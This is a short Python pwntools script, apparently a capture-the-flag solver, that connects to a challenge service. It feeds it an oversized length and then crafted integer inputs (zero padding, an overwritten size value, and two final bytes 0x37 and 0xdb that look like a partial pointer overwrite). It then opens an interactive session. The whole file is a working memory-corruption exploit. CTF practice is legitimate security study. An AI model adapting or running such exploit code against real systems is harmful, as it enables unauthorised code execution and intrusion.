import argparse

from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

r.recvuntil(b'?')
r.sendline(str(0x38 + 1))

for _ in range(0, 0x38 - 0x14):
    r.recvuntil(b': ')
    r.sendline("0")
r.recvuntil(b': ')
r.sendline(str(0x38 + 1))
for _ in range(0, 0x13 - 0xc):
    r.recvuntil(b': ')
    r.sendline("0")
r.recvuntil(b': ')
r.sendline(str(0x37))
r.recvuntil(b': ')
r.sendline(str(0xdb))

r.interactive()
